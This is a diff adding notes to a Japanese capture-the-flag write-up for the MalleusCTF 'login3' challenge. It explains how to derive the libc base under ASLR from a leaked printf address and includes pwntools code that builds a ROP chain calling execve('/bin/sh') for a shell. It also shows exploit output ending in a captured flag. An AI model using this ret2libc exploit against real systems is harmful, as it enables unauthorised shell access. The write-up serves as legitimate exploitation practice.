@@ -1,3 +1,30 @@
+## 詰まった点
+
+libc内のアドレス：あくまでもlibcの先頭からの相対アドレス
+
+つまり、絶対アドレスは`libcのアドレス + libc内のアドレス`となる
+
+ゴールとしては、libc内の`/bin/sh`を動かす事である
+
+それにはサーバ上で動くlibcのアドレスが必要となる
+
+そこで、ASLRがONとなった状態の`printf`の絶対アドレスから、libc内の`printf`のアドレスを差し引く事で、サーバ上で動くlibcのアドレスが分かる。
+
+そして、ROPのチェインを組む際のlibcのアドレスとして、上記で求めたサーバ上のlibcのアドレスを指定し、`execve(/bin/sh, 0)`を実行する事でシェルが取れる
+```
+printf = unpack(printf[:-1].ljust(8, b'\0'))
+print('printf: %x' %printf)                  #7f4d9b8b0e80
+print('libc printf %x' %libc.symbols.printf) #64e80
+
+libc.address = printf - libc.symbols.printf
+
+rop = ROP(libc)
+addr_sh = libc.search(b'/bin/sh').next() 
+rop.execve(addr_sh, 0, 0)
+```
+
+## exploit
+
 ```
 $ python exploit.py r
 [*] 'ctf/writeup/MalleusCTF/login3/login3'
@@ -39,5 +66,4 @@ $ cat flag.txt
 FLAG{vOvF4gQyzrRq50eH}
 $
 [*] Closed connection to host port 10003
-
 ```
